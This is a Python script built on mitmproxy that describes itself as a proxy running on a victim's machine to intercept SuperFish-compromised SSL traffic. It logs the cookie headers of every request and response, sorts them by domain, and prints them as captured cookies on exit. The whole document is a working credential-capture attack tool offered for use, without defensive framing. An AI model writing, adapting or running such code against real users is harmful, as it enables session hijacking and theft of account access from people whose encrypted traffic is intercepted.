from libmproxy import controller, proxy
from libmproxy.proxy.server import ProxyServer
import sys, argparse

class master(controller.Master):
        def __init__(self, server):
                controller.Master.__init__(self, server)
                self.cookies = {}

        def print_cookies(self):
                for x in self.cookies:
                        print '---------------------'
                        print '[^^] Cookie Captured:'
                        print '[^^] Domain: %s' % x
                        for v in self.cookies[x]:
                                if v is not '':
                                        print '[^^] Cookies: %s' % ''.join(self.cookies[x])

        def ptry(self):
                try:
                        controller.Master.run(self)
                except KeyboardInterrupt:
                        self.print_cookies()
                        self.shutdown()
                except error:
                        print '[!!] Experienced critical error. Shutting down.'
                        self.shutdown()
        def run(self):
                print '[**] Successfully started and proxying requests.'
                while True:
                        self.ptry()

        def handle_request(self, flow):
                if flow.request.host in self.cookies:
                        self.cookies[flow.request.host].append(''.join(flow.request.headers['cookie']))
                else:
                        self.cookies[flow.request.host] = [ ''.join(flow.request.headers['cookie']) ]
                flow.reply()

        def handle_response(self, flow):
                if flow.request.host in self.cookies:
                        self.cookies[flow.request.host].append(''.join(flow.response.headers['cookie']))
                else:
                        self.cookies[flow.request.host] = [ ''.join(flow.response.headers['cookie']) ]
                flow.reply()

if __name__ == '__main__':

        description = '[**] Proxy server running on victims machine which will intercept SuperFish encrypted SSL traffic'

        parser = argparse.ArgumentParser(description=description)
        parser.add_argument('address', help='Local/remote address to listen on')
        parser.add_argument('port', type=int, help='Port to listen on')
        parser.add_argument(    '--ca-dir',
                                dest='ca_dir',
                                help='Specify your CA dir ~/home/mitmproxy-ca.pem | Default is ~/.mitmproxy/mitmproxy-ca.pem')

        args = parser.parse_args()

        if not args.ca_dir:
                args.ca_dir = '~/.mitmproxy/'

        config = proxy.ProxyConfig(args.address, args.port, cadir=args.ca_dir)
        server = ProxyServer(config)

        m = master(server)
        m.run()
